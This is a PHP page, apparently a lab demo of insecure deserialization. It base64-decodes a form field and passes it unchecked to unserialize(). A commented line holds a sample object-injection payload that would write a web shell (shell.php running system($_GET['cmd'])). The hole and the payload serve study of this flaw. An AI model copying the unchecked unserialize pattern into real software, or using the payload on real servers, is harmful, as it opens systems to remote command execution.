<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Deserialize</title>
    <a href="./index.php"> Serialize</a>

    <!-- Fonts -->
    <link rel="dns-prefetch" href="//fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito" rel="stylesheet">

    <!-- Styles -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">Deserialize</div>

                <div class="card-body">
                    <form method="POST" action="">
                        <div class="form-group row">
                            <label for="str" class="col-md-4 col-form-label text-md-right">String</label>

                            <div class="col-md-6">
                                <input id="str" type="text" class="form-control" name="str" value="" required autocomplete="str" autofocus>
                            </div>

                        </div>
                        <div class="form-group row mb-0">
                            <div class="col-md-6 offset-md-4">
                                <button type="submit" class="btn btn-primary">
                                    Go !
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

<?php
require "Student.php";
require "File.php";
if($_SERVER["REQUEST_METHOD"] == "POST"){
	$str=trim($_POST["str"]);
	$str=base64_decode($str);
	/*$str='O:4:"File":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:35:"<?php echo system($_GET[\'cmd\']); ?>";}';*/
	$o= unserialize($str);
	
	echo "Username: ".$o->username."<br>";
	echo "Email: ".$o->email."<br>";
	echo "Birthyear: ".$o->birthyear."<br>";
	echo "Gender: ".$o->gender."<br>";

}

?>